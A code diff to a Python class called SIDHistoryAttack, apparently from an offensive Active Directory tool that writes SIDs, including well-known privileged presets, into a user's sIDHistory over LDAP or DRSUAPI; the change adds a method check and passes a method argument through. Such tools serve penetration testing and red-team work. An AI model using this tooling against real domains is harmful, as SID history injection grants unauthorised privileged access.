@@ -176,6 +176,12 @@ class SIDHistoryAttack:
     def add_sid_to_history(self, target_user: str, sid_to_add: str,
                            method: str = METHOD_LDAP) -> bool:
         """Add a SID to an object's sIDHistory."""
+        if method == self.METHOD_DRSUAPI:
+            logging.error("DRSUAPI (DRSAddSidHistory) cannot inject arbitrary SIDs.")
+            logging.error("Use --source-user/--source-domain with --method drsuapi,")
+            logging.error("or use --method ldap for --sid/--preset injection.")
+            return False
+
         if not self.ldap_ops:
             logging.error("Not connected")
             return False
@@ -206,7 +212,8 @@ class SIDHistoryAttack:
             logging.error(f"Error adding SID to history: {e}")
             return False
 
-    def add_sid_preset(self, target_user: str, preset_name: str) -> bool:
+    def add_sid_preset(self, target_user: str, preset_name: str,
+                       method: str = METHOD_LDAP) -> bool:
         """Add a well-known SID preset to an object's sIDHistory."""
         sid = self.resolve_preset(preset_name)
         if not sid:
@@ -216,7 +223,7 @@ class SIDHistoryAttack:
 
         name = SIDConverter.resolve_sid_name(sid, self.domain_sid)
         logging.info(f"Preset '{preset_name}' -> {sid} ({name})")
-        return self.add_sid_to_history(target_user, sid)
+        return self.add_sid_to_history(target_user, sid, method=method)
 
     def _inject_via_drsuapi(self, target_user: str, source_user: str,
                              source_domain: Optional[str] = None) -> bool:
